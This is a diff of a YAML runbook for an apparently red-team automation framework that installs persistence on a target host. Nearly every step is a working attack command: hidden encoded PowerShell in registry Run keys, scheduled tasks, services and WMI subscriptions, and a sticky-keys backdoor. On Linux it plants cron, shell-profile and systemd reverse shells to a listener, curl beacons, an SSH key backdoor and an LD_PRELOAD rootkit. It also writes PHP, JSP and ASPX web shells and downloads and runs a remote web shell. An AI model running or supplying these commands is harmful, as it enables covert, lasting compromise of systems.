@@ -1,349 +1,609 @@
-# v2 runbook — Persistence mechanisms (Windows, Linux, Web)
-name: "Persistence"
-description: "Establish and detect persistence: Windows registry run keys, scheduled tasks, services, WMI, startup folder; Linux cron, .bashrc, SSH keys, systemd; web shells"
-version: "2.0"
-
+name: Persistence
+description: 'Establish and detect persistence: Windows registry run keys, scheduled
+  tasks, services, WMI, startup folder; Linux cron, .bashrc, SSH keys, systemd; web
+  shells'
+version: '2.0'
 vars:
-  target_host: ""
-  target_user: ""
-  target_pass: ""
-  target_hash: ""
-  listener_ip: ""
+  target_host: ''
+  target_user: ''
+  target_pass: ''
+  target_hash: ''
+  listener_ip: ''
   listener_port: 443
-  persistence_type: "auto"  # auto | windows | linux | web
-
+  persistence_type: auto
 steps:
-  - id: preamble
-    type: log
-    message: "Persistence — {target_host} (case: {case_id})"
+- id: preamble
+  type: log
+  message: 'Persistence — {target_host} (case: {case_id})'
+  name: Preamble
+- id: win_registry
+  name: Windows registry persistence
+  type: parallel
+  max_workers: 4
+  steps:
+  - id: reg_currentuser
+    name: HKCU Run key
+    tool: powershell
+    args:
+    - -Command
+    - $payload='powershell -w hidden -enc BASE64_PAYLOAD'; New-ItemProperty -Path
+      'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'Updater' -Value
+      $payload -Force
+    - -o
+    - '{case_dir}/registry_hkcu_run.txt'
+    timeout: 15
+    artifacts:
+    - '{case_dir}/registry_hkcu_run.txt'
+    type: tool
+  - id: reg_localmachine
+    name: HKLM Run key (admin)
+    tool: powershell
+    args:
+    - -Command
+    - $payload='powershell -w hidden -enc BASE64_PAYLOAD'; New-ItemProperty -Path
+      'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'SecurityScan' -Value
+      $payload -Force
+    - -o
+    - '{case_dir}/registry_hklm_run.txt'
+    timeout: 15
+    type: tool
+  - id: reg_runonce
+    name: RunOnce key
+    tool: powershell
+    args:
+    - -Command
+    - $payload='powershell -w hidden -enc BASE64_PAYLOAD'; New-ItemProperty -Path
+      'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' -Name '*UpdateCheck'
+      -Value $payload -Force
+    - -o
+    - '{case_dir}/registry_runonce.txt'
+    timeout: 15
+    type: tool
+  - id: reg_logon
+    name: UserInitMprLogonScript
+    tool: powershell
+    args:
+    - -Command
+    - $payload='powershell -w hidden -enc BASE64_PAYLOAD'; New-ItemProperty -Path
+      'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name 'UserInitMprLogonScript'
+      -Value $payload -Force
+    - -o
+    - '{case_dir}/registry_logon_script.txt'
+    timeout: 15
+    type: tool
+  - id: reg_debugger
+    name: Image File Execution Options (IFEO)
+    tool: powershell
+    args:
+    - -Command
+    - New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
+      Execution Options\sethc.exe' -Force; New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows
+      NT\CurrentVersion\Image File Execution Options\sethc.exe' -Name 'Debugger' -Value
+      'C:\Windows\System32\cmd.exe' -Force
+    - -o
+    - '{case_dir}/registry_ifeo_stickykeys.txt'
+    timeout: 15
+    type: tool
+- id: win_tasks
+  name: Windows scheduled tasks
+  type: parallel
+  steps:
+  - id: task_schtasks
+    name: Create scheduled task (schtasks)
+    tool: powershell
+    args:
+    - -Command
+    - $action=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden
+      -enc BASE64_PAYLOAD'; $trigger=New-ScheduledTaskTrigger -AtStartup; $principal=New-ScheduledTaskPrincipal
+      -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask
+      -TaskName 'WindowsUpdateTask' -Action $action -Trigger $trigger -Principal $principal
+      -Force
+    - -o
+    - '{case_dir}/scheduled_task_system.txt'
+    timeout: 15
+    artifacts:
+    - '{case_dir}/scheduled_task_system.txt'
+    type: tool
+  - id: task_user_logon
+    name: At-user logon task
+    tool: powershell
+    args:
+    - -Command
+    - $action=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden
+      -enc BASE64_PAYLOAD'; $trigger=New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask
+      -TaskName 'UserSessionInit' -Action $action -Trigger $trigger -Force
+    - -o
+    - '{case_dir}/scheduled_task_logon.txt'
+    timeout: 15
+    type: tool
+  - id: task_idle
+    name: On-idle task
+    tool: powershell
+    args:
+    - -Command
+    - $action=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden
+      -enc BASE64_PAYLOAD'; $trigger=New-ScheduledTaskTrigger -Daily -At 9am; $settings=New-ScheduledTaskSettingsSet
+      -StartWhenAvailable; Register-ScheduledTask -TaskName 'SecurityHealthHost' -Action
+      $action -Trigger $trigger -Settings $settings -Force
+    - -o
+    - '{case_dir}/scheduled_task_daily.txt'
+    timeout: 15
+    type: tool
+- id: win_services
+  name: Windows service persistence
+  type: parallel
+  steps:
+  - id: svc_create
+    name: Create persistent service
+    tool: powershell
+    args:
+    - -Command
+    - New-Service -Name 'WindowsSecuritySvc' -DisplayName 'Windows Security Service'
+      -BinaryPathName 'powershell.exe -w hidden -enc BASE64_PAYLOAD' -StartupType
+      Automatic -Description 'Provides essential security monitoring'
+    - -o
+    - '{case_dir}/persistent_service.txt'
+    timeout: 15
+    artifacts:
+    - '{case_dir}/persistent_service.txt'
+    type: tool
+  - id: svc_mod_bin
+    name: Modify existing service binary
+    tool: powershell
+    args:
+    - -Command
+    - sc.exe config 'TrustedInstaller' binPath= 'powershell.exe -w hidden -enc BASE64_PAYLOAD'
+    - -o
+    - '{case_dir}/service_binpath.txt'
+    timeout: 15
+    type: tool
+  - id: svc_failure
+    name: Service failure restart (persistence)
+    tool: powershell
+    args:
+    - -Command
+    - sc.exe failure 'WindowsSecuritySvc' reset=86400 actions=restart/60000/restart/60000/restart/60000;
+      sc.exe failureflag 'WindowsSecuritySvc' 1
+    - -o
+    - '{case_dir}/service_failure_persist.txt'
+    timeout: 15
+    type: tool
+- id: win_wmi
+  name: WMI event persistence
+  type: sequential
+  steps:
+  - id: wmi_filter
+    name: Create WMI event filter
+    tool: powershell
+    args:
+    - -Command
+    - $filter=Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments
+      @{Name='SystemHealthFilter'; EventNameSpace='root\cimv2'; QueryLanguage='WQL';
+      Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance
+      ISA 'Win32_PerfFormattedData_PerfOS_System'"}; $consumer=Set-WmiInstance -Namespace
+      root\subscription -Class CommandLineEventConsumer -Arguments @{Name='SystemHealthConsumer';
+      CommandLineTemplate='powershell -w hidden -enc BASE64_PAYLOAD'}; Set-WmiInstance
+      -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;
+      Consumer=$consumer}
+    - -o
+    - '{case_dir}/wmi_persistence.txt'
+    timeout: 15
+    artifacts:
+    - '{case_dir}/wmi_persistence.txt'
+    type: tool
+- id: win_startup
+  name: Startup folder persistence
+  type: sequential
+  steps:
+  - id: startup_lnk
+    name: Startup folder LNK
+    tool: powershell
+    args:
+    - -Command
+    - $wshell=New-Object -ComObject WScript.Shell; $shortcut=$wshell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start
+      Menu\Programs\Startup\WindowsUpdate.lnk"); $shortcut.TargetPath='powershell.exe';
+      $shortcut.Arguments='-w hidden -enc BASE64_PAYLOAD'; $shortcut.WindowStyle=7;
+      $shortcut.Save()
+    - -o
+    - '{case_dir}/startup_lnk.txt'
+    timeout: 15
+    artifacts:
+    - '{case_dir}/startup_lnk.txt'
+    type: tool
+- id: linux_cron
+  name: Linux cron persistence
+  type: parallel
+  steps:
+  - id: cron_user
+    name: User crontab
+    tool: bash
+    args:
+    - -c
+    - (crontab -l 2>/dev/null; echo '@reboot bash -c "bash -i >& /dev/tcp/{listener_ip}/{listener_port}
+      0>&1 &"') | crontab -
+    - -o
+    - '{case_dir}/linux_cron_user.txt'
+    timeout: 15
+    artifacts:
+    - '{case_dir}/linux_cron_user.txt'
+    type: tool
+  - id: cron_system
+    name: System crontab
+    tool: bash
+    args:
+    - -c
+    - echo '@reboot root bash -c "bash -i >& /dev/tcp/{listener_ip}/{listener_port}
+      0>&1"' >> /etc/crontab
+    - -o
+    - '{case_dir}/linux_cron_system.txt'
+    timeout: 15
+    type: tool
+  - id: cron_interval
+    name: Interval cron (5 min beacon)
+    tool: bash
+    args:
+    - -c
+    - (crontab -l 2>/dev/null; echo '*/5 * * * * bash -c "curl -s http://{listener_ip}/beacon
+      >/dev/null &"') | crontab -
+    - -o
+    - '{case_dir}/linux_cron_beacon.txt'
+    timeout: 15
+    type: tool
+- id: linux_profile
+  name: Linux shell initialization
+  type: parallel
+  steps:
+  - id: bashrc
+    name: .bashrc payload
+    tool: bash
+    args:
+    - -c
+    - echo 'bash -c "bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1 &"' >>
+      ~/.bashrc
+    - -o
+    - '{case_dir}/linux_bashrc.txt'
+    timeout: 15
+    artifacts:
+    - '{case_dir}/linux_bashrc.txt'
+    type: tool
+  - id: profile
+    name: Profile script
+    tool: bash
+    args:
+    - -c
+    - echo 'bash -c "bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1 &"' >>
+      ~/.profile
+    - -o
+    - '{case_dir}/linux_profile.txt'
+    timeout: 15
+    type: tool
+  - id: ssh_authorized
+    name: SSH authorized_keys backdoor
+    tool: bash
+    args:
+    - -c
+    - mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...'
+      >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
+    - -o
+    - '{case_dir}/linux_ssh_key.txt'
+    timeout: 15
+    artifacts:
+    - '{case_dir}/linux_ssh_key.txt'
+    type: tool
+  - id: sshd_backdoor
+    name: SSHD config backdoor
+    tool: bash
+    args:
+    - -c
+    - echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && echo 'PasswordAuthentication
+      yes' >> /etc/ssh/sshd_config && systemctl restart sshd
+    - -o
+    - '{case_dir}/linux_sshd_config.txt'
+    timeout: 15
+    type: tool
+- id: linux_systemd
+  name: Systemd service persistence
+  type: sequential
+  steps:
+  - id: systemd_service
+    name: Create systemd service
+    tool: bash
+    args:
+    - -c
+    - 'cat > /etc/systemd/system/health-check.service << ''EOF''
 
-  # Phase 1: Windows — Registry run keys
-  - id: win_registry
-    name: "Windows registry persistence"
-    type: parallel
-    max_workers: 4
-    steps:
-      - id: reg_currentuser
-        name: "HKCU Run key"
-        tool: powershell
-        args: ["-Command",
-               "$payload='powershell -w hidden -enc BASE64_PAYLOAD'; New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Updater' -Value $payload -Force",
-               "-o", "{case_dir}/registry_hkcu_run.txt"]
-        timeout: 15
-        artifacts: ["{case_dir}/registry_hkcu_run.txt"]
+      [Unit]
 
-      - id: reg_localmachine
-        name: "HKLM Run key (admin)"
-        tool: powershell
-        args: ["-Command",
-               "$payload='powershell -w hidden -enc BASE64_PAYLOAD'; New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SecurityScan' -Value $payload -Force",
-               "-o", "{case_dir}/registry_hklm_run.txt"]
-        timeout: 15
+      Description=System Health Check
 
-      - id: reg_runonce
-        name: "RunOnce key"
-        tool: powershell
-        args: ["-Command",
-               "$payload='powershell -w hidden -enc BASE64_PAYLOAD'; New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce' -Name '*UpdateCheck' -Value $payload -Force",
-               "-o", "{case_dir}/registry_runonce.txt"]
-        timeout: 15
+      After=network.target
 
-      - id: reg_logon
-        name: "UserInitMprLogonScript"
-        tool: powershell
-        args: ["-Command",
-               "$payload='powershell -w hidden -enc BASE64_PAYLOAD'; New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' -Name 'UserInitMprLogonScript' -Value $payload -Force",
-               "-o", "{case_dir}/registry_logon_script.txt"]
-        timeout: 15
 
-      - id: reg_debugger
-        name: "Image File Execution Options (IFEO)"
-        tool: powershell
-        args: ["-Command",
-               "New-Item -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe' -Force; New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe' -Name 'Debugger' -Value 'C:\\Windows\\System32\\cmd.exe' -Force",
-               "-o", "{case_dir}/registry_ifeo_stickykeys.txt"]
-        timeout: 15
+      [Service]
 
-  # Phase 2: Windows — Scheduled tasks
-  - id: win_tasks
-    name: "Windows scheduled tasks"
-    type: parallel
-    steps:
-      - id: task_schtasks
-        name: "Create scheduled task (schtasks)"
-        tool: powershell
-        args: ["-Command",
-               "$action=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden -enc BASE64_PAYLOAD'; $trigger=New-ScheduledTaskTrigger -AtStartup; $principal=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName 'WindowsUpdateTask' -Action $action -Trigger $trigger -Principal $principal -Force",
-               "-o", "{case_dir}/scheduled_task_system.txt"]
-        timeout: 15
-        artifacts: ["{case_dir}/scheduled_task_system.txt"]
+      Type=simple
 
-      - id: task_user_logon
-        name: "At-user logon task"
-        tool: powershell
-        args: ["-Command",
-               "$action=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden -enc BASE64_PAYLOAD'; $trigger=New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -TaskName 'UserSessionInit' -Action $action -Trigger $trigger -Force",
-               "-o", "{case_dir}/scheduled_task_logon.txt"]
-        timeout: 15
+      ExecStart=/bin/bash -c ''bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1''
 
-      - id: task_idle
-        name: "On-idle task"
-        tool: powershell
-        args: ["-Command",
-               "$action=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden -enc BASE64_PAYLOAD'; $trigger=New-ScheduledTaskTrigger -Daily -At 9am; $settings=New-ScheduledTaskSettingsSet -StartWhenAvailable; Register-ScheduledTask -TaskName 'SecurityHealthHost' -Action $action -Trigger $trigger -Settings $settings -Force",
-               "-o", "{case_dir}/scheduled_task_daily.txt"]
-        timeout: 15
+      Restart=always
 
-  # Phase 3: Windows — Service persistence
-  - id: win_services
-    name: "Windows service persistence"
-    type: parallel
-    steps:
-      - id: svc_create
-        name: "Create persistent service"
-        tool: powershell
-        args: ["-Command",
-               "New-Service -Name 'WindowsSecuritySvc' -DisplayName 'Windows Security Service' -BinaryPathName 'powershell.exe -w hidden -enc BASE64_PAYLOAD' -StartupType Automatic -Description 'Provides essential security monitoring'",
-               "-o", "{case_dir}/persistent_service.txt"]
-        timeout: 15
-        artifacts: ["{case_dir}/persistent_service.txt"]
+      RestartSec=60
 
-      - id: svc_mod_bin
-        name: "Modify existing service binary"
-        tool: powershell
-        args: ["-Command",
-               "sc.exe config 'TrustedInstaller' binPath= 'powershell.exe -w hidden -enc BASE64_PAYLOAD'",
-               "-o", "{case_dir}/service_binpath.txt"]
-        timeout: 15
 
-      - id: svc_failure
-        name: "Service failure restart (persistence)"
-        tool: powershell
-        args: ["-Command",
-               "sc.exe failure 'WindowsSecuritySvc' reset=86400 actions=restart/60000/restart/60000/restart/60000; sc.exe failureflag 'WindowsSecuritySvc' 1",
-               "-o", "{case_dir}/service_failure_persist.txt"]
-        timeout: 15
+      [Install]
 
-  # Phase 4: Windows — WMI event subscription
-  - id: win_wmi
-    name: "WMI event persistence"
-    type: sequential
-    steps:
-      - id: wmi_filter
-        name: "Create WMI event filter"
-        tool: powershell
-        args: ["-Command",
-               "$filter=Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{Name='SystemHealthFilter'; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}; $consumer=Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name='SystemHealthConsumer'; CommandLineTemplate='powershell -w hidden -enc BASE64_PAYLOAD'}; Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}",
-               "-o", "{case_dir}/wmi_persistence.txt"]
-        timeout: 15
-        artifacts: ["{case_dir}/wmi_persistence.txt"]
+      WantedBy=multi-user.target
 
-  # Phase 5: Windows — Startup folder
-  - id: win_startup
-    name: "Startup folder persistence"
-    type: sequential
-    steps:
-      - id: startup_lnk
-        name: "Startup folder LNK"
-        tool: powershell
-        args: ["-Command",
-               "$wshell=New-Object -ComObject WScript.Shell; $shortcut=$wshell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.lnk\"); $shortcut.TargetPath='powershell.exe'; $shortcut.Arguments='-w hidden -enc BASE64_PAYLOAD'; $shortcut.WindowStyle=7; $shortcut.Save()",
-               "-o", "{case_dir}/startup_lnk.txt"]
-        timeout: 15
-        artifacts: ["{case_dir}/startup_lnk.txt"]
+      EOF
 
-  # Phase 6: Linux — Cron
-  - id: linux_cron
-    name: "Linux cron persistence"
-    type: parallel
-    steps:
-      - id: cron_user
-        name: "User crontab"
-        tool: bash
-        args: ["-c",
-               "(crontab -l 2>/dev/null; echo '@reboot bash -c \"bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1 &\"') | crontab -",
-               "-o", "{case_dir}/linux_cron_user.txt"]
-        timeout: 15
-        artifacts: ["{case_dir}/linux_cron_user.txt"]
+      systemctl enable health-check.service && systemctl start health-check.service'
+    - -o
+    - '{case_dir}/systemd_service.txt'
+    timeout: 15
+    artifacts:
+    - '{case_dir}/systemd_service.txt'
+    type: tool
+  - id: systemd_timer
+    name: Systemd timer (interval)
+    tool: bash
+    args:
+    - -c
+    - 'cat > /etc/systemd/system/health-beacon.service << ''EOF''
 
-      - id: cron_system
-        name: "System crontab"
-        tool: bash
-        args: ["-c",
-               "echo '@reboot root bash -c \"bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1\"' >> /etc/crontab",
-               "-o", "{case_dir}/linux_cron_system.txt"]
-        timeout: 15
+      [Unit]
 
-      - id: cron_interval
-        name: "Interval cron (5 min beacon)"
-        tool: bash
-        args: ["-c",
-               "(crontab -l 2>/dev/null; echo '*/5 * * * * bash -c \"curl -s http://{listener_ip}/beacon >/dev/null &\"') | crontab -",
-               "-o", "{case_dir}/linux_cron_beacon.txt"]
-        timeout: 15
+      Description=Health Beacon
 
-  # Phase 7: Linux — Profile & rc scripts
-  - id: linux_profile
-    name: "Linux shell initialization"
-    type: parallel
-    steps:
-      - id: bashrc
-        name: ".bashrc payload"
-        tool: bash
-        args: ["-c",
-               "echo 'bash -c \"bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1 &\"' >> ~/.bashrc",
-               "-o", "{case_dir}/linux_bashrc.txt"]
-        timeout: 15
-        artifacts: ["{case_dir}/linux_bashrc.txt"]
 
-      - id: profile
-        name: "Profile script"
-        tool: bash
-        args: ["-c",
-               "echo 'bash -c \"bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1 &\"' >> ~/.profile",
-               "-o", "{case_dir}/linux_profile.txt"]
-        timeout: 15
+      [Service]
 
-      - id: ssh_authorized
-        name: "SSH authorized_keys backdoor"
-        tool: bash
-        args: ["-c",
-               "mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
-               "-o", "{case_dir}/linux_ssh_key.txt"]
-        timeout: 15
-        artifacts: ["{case_dir}/linux_ssh_key.txt"]
+      Type=oneshot
 
-      - id: sshd_backdoor
-        name: "SSHD config backdoor"
-        tool: bash
-        args: ["-c",
-               "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config && systemctl restart sshd",
-               "-o", "{case_dir}/linux_sshd_config.txt"]
-        timeout: 15
+      ExecStart=/usr/bin/curl -s http://{listener_ip}/beacon
 
-  # Phase 8: Linux — Systemd
-  - id: linux_systemd
-    name: "Systemd service persistence"
-    type: sequential
-    steps:
-      - id: systemd_service
-        name: "Create systemd service"
-        tool: bash
-        args: ["-c",
-               "cat > /etc/systemd/system/health-check.service << 'EOF'\n[Unit]\nDescription=System Health Check\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1'\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable health-check.service && systemctl start health-check.service",
-               "-o", "{case_dir}/systemd_service.txt"]
-        timeout: 15
-        artifacts: ["{case_dir}/systemd_service.txt"]
+      EOF
 
-      - id: systemd_timer
-        name: "Systemd timer (interval)"
-        tool: bash
-        args: ["-c",
-               "cat > /etc/systemd/system/health-beacon.service << 'EOF'\n[Unit]\nDescription=Health Beacon\n\n[Service]\nType=oneshot\nExecStart=/usr/bin/curl -s http://{listener_ip}/beacon\nEOF\ncat > /etc/systemd/system/health-beacon.timer << 'EOF'\n[Unit]\nDescription=Health Beacon Timer\n\n[Timer]\nOnBootSec=1min\nOnUnitActiveSec=5min\n\n[Install]\nWantedBy=timers.target\nEOF\nsystemctl daemon-reload && systemctl enable health-beacon.timer && systemctl start health-beacon.timer",
-               "-o", "{case_dir}/systemd_timer.txt"]
-        timeout: 15
+      cat > /etc/systemd/system/health-beacon.timer << ''EOF''
 
-  # Phase 9: Linux — LD_PRELOAD / library injection
-  - id: linux_ldpreload
-    name: "LD_PRELOAD persistence"
-    type: sequential
-    steps:
-      - id: lib_inject
-        name: "LD_PRELOAD rootkit"
-        tool: bash
-        args: ["-c",
-               "cat > /tmp/rootkit.c << 'EOF'\n#include <stdio.h>\n#include <unistd.h>\n#include <sys/types.h>\nuid_t getuid(){return 0;}\nuid_t geteuid(){return 0;}\nEOF\ngcc -shared -fPIC -o /usr/lib/libreset.so /tmp/rootkit.c -ldl\necho '/usr/lib/libreset.so' >> /etc/ld.so.preload",
-               "-o", "{case_dir}/linux_ld_preload.txt"]
-        timeout: 30
-        artifacts: ["{case_dir}/linux_ld_preload.txt"]
+      [Unit]
 
-  # Phase 10: Web shells
-  - id: web_shell
-    name: "Web shell persistence"
-    type: parallel
-    max_workers: 4
-    steps:
-      - id: webshell_php
-        name: "PHP web shell"
-        tool: python3
-        args: ["-c",
-               "\"shell='''<?php system(\\\\\\$_GET['cmd']); ?>'''\nopen('{case_dir}/shell.php','w').write(shell)\nprint('PHP web shell created')\"",
-               "-o", "{case_dir}/webshell_php.txt"]
-        timeout: 15
-        artifacts: ["{case_dir}/shell.php"]
+      Description=Health Beacon Timer
 
-      - id: webshell_jsp
-        name: "JSP web shell"
-        tool: python3
-        args: ["-c",
-               "\"shell='''<%@page import=\\\\\\\"java.io.*\\\\\\\"%><% Process p=Runtime.getRuntime().exec(request.getParameter(\\\\\\\"cmd\\\\\\\")); BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=br.readLine())!=null) out.println(l); %>'''\nopen('{case_dir}/shell.jsp','w').write(shell)\nprint('JSP web shell created')\"",
-               "-o", "{case_dir}/webshell_jsp.txt"]
-        timeout: 15
 
-      - id: webshell_aspx
-        name: "ASPX web shell"
-        tool: python3
-        args: ["-c",
-               "\"shell='''<%@ Page Language=\\\\\\\"C#\\\\\\\" %><% System.Diagnostics.Process p=new System.Diagnostics.Process(); p.StartInfo.FileName=\\\\\\\"cmd.exe\\\\\\\"; p.StartInfo.Arguments=\\\\\\\"/c \\\\\\\"+Request.QueryString[\\\\\\\"cmd\\\\\\\"]; p.StartInfo.UseShellExecute=false; p.StartInfo.RedirectStandardOutput=true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>'''\nopen('{case_dir}/shell.aspx','w').write(shell)\nprint('ASPX web shell created')\"",
-               "-o", "{case_dir}/webshell_aspx.txt"]
-        timeout: 15
+      [Timer]
 
-      - id: webshell_nishang
-        name: "Nishang web shell"
-        tool: powershell
-        args: ["-Command",
-               "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Antak-WebShell/antak.aspx'); Out-File -FilePath '{case_dir}/antak.aspx' -InputObject $webpage",
-               "-o", "{case_dir}/webshell_nishang.txt"]
-        timeout: 30
+      OnBootSec=1min
 
-  # Phase 11: Detection checklist
-  - id: detection
-    name: "Persistence detection notes"
-    type: sequential
-    steps:
-      - id: detection_guide
-        name: "Detection & cleanup guide"
-        tool: python3
-        args: ["-c",
-               "\"print('=== PERSISTENCE DETECTION & CLEANUP ===')\nprint()\nprint('Windows detection:')\nprint('  autorunsc -a -c C:\\\\Windows\\\\System32\\\\autorunsc64.exe')\nprint('  Get-WmiObject -Namespace root\\\\subscription -Class __FilterToConsumerBinding')\nprint('  schtasks /query /fo CSV /v')\nprint('  wmic startup list full')\nprint()\nprint('Linux detection:')\nprint('  auditd: ausearch --start today -k persistence')\nprint('  crontab -l && ls -la /etc/cron*')\nprint('  systemctl list-timers --all')\nprint('  cat /etc/ld.so.preload')\nprint('  cat ~/.ssh/authorized_keys')\nprint()\nprint('Cleanup:')\nprint('  Windows: reg delete, schtasks /delete, sc delete')\nprint('  Linux: remove cron, delete .ssh key, rm systemd unit')\n\"",
-               "-o", "{case_dir}/persistence_detection.txt"]
-        timeout: 15
+      OnUnitActiveSec=5min
 
-  # Phase 12: Report
-  - id: report
-    name: "Generate persistence report"
-    type: report
-    format: markdown
-    title: "Persistence Mechanisms — {target_host}"
-    output: "{case_dir}/persistence-report.md"
-    sections:
-      - heading: "Target"
-        body: "- Host: {target_host}\n- Listener: {listener_ip}:{listener_port}\n- Case: {case_id}"
-      - heading: "Windows Registry"
-        body: "- HKCU Run: {case_dir}/registry_hkcu_run.txt\n- HKLM Run: {case_dir}/registry_hklm_run.txt\n- RunOnce: {case_dir}/registry_runonce.txt\n- IFEO (sticky keys): {case_dir}/registry_ifeo_stickykeys.txt"
-      - heading: "Windows Scheduled Tasks"
-        body: "- SYSTEM task: {case_dir}/scheduled_task_system.txt\n- Logon task: {case_dir}/scheduled_task_logon.txt"
-      - heading: "Windows Services"
-        body: "- New service: {case_dir}/persistent_service.txt\n- Mod binpath: {case_dir}/service_binpath.txt\n- Failure restart: {case_dir}/service_failure_persist.txt"
-      - heading: "Windows WMI"
-        body: "- Event subscription: {case_dir}/wmi_persistence.txt"
-      - heading: "Windows Startup"
-        body: "- LNK: {case_dir}/startup_lnk.txt"
-      - heading: "Linux Cron"
-        body: "- User: {case_dir}/linux_cron_user.txt\n- System: {case_dir}/linux_cron_system.txt\n- Beacon: {case_dir}/linux_cron_beacon.txt"
-      - heading: "Linux Profile"
-        body: "- .bashrc: {case_dir}/linux_bashrc.txt\n- .profile: {case_dir}/linux_profile.txt\n- SSH key: {case_dir}/linux_ssh_key.txt\n- SSHD config: {case_dir}/linux_sshd_config.txt"
-      - heading: "Linux Systemd"
-        body: "- Service: {case_dir}/systemd_service.txt\n- Timer: {case_dir}/systemd_timer.txt"
-      - heading: "Linux LD_PRELOAD"
-        body: "- LD_PRELOAD rootkit: {case_dir}/linux_ld_preload.txt"
-      - heading: "Web Shells"
-        body: "- PHP: {case_dir}/shell.php\n- JSP: {case_dir}/shell.jsp\n- ASPX: {case_dir}/shell.aspx\n- Nishang: {case_dir}/webshell_nishang.txt"
-      - heading: "Detection"
-        body: "- Cleanup guide: {case_dir}/persistence_detection.txt"
 
+      [Install]
+
+      WantedBy=timers.target
+
+      EOF
+
+      systemctl daemon-reload && systemctl enable health-beacon.timer && systemctl
+      start health-beacon.timer'
+    - -o
+    - '{case_dir}/systemd_timer.txt'
+    timeout: 15
+    type: tool
+- id: linux_ldpreload
+  name: LD_PRELOAD persistence
+  type: sequential
+  steps:
+  - id: lib_inject
+    name: LD_PRELOAD rootkit
+    tool: bash
+    args:
+    - -c
+    - 'cat > /tmp/rootkit.c << ''EOF''
+
+      #include <stdio.h>
+
+      #include <unistd.h>
+
+      #include <sys/types.h>
+
+      uid_t getuid(){return 0;}
+
+      uid_t geteuid(){return 0;}
+
+      EOF
+
+      gcc -shared -fPIC -o /usr/lib/libreset.so /tmp/rootkit.c -ldl
+
+      echo ''/usr/lib/libreset.so'' >> /etc/ld.so.preload'
+    - -o
+    - '{case_dir}/linux_ld_preload.txt'
+    timeout: 30
+    artifacts:
+    - '{case_dir}/linux_ld_preload.txt'
+    type: tool
+- id: web_shell
+  name: Web shell persistence
+  type: parallel
+  max_workers: 4
+  steps:
+  - id: webshell_php
+    name: PHP web shell
+    tool: python3
+    args:
+    - -c
+    - '"shell=''''''<?php system(\\\$_GET[''cmd'']); ?>''''''
+
+      open(''{case_dir}/shell.php'',''w'').write(shell)
+
+      print(''PHP web shell created'')"'
+    - -o
+    - '{case_dir}/webshell_php.txt'
+    timeout: 15
+    artifacts:
+    - '{case_dir}/shell.php'
+    type: tool
+  - id: webshell_jsp
+    name: JSP web shell
+    tool: python3
+    args:
+    - -c
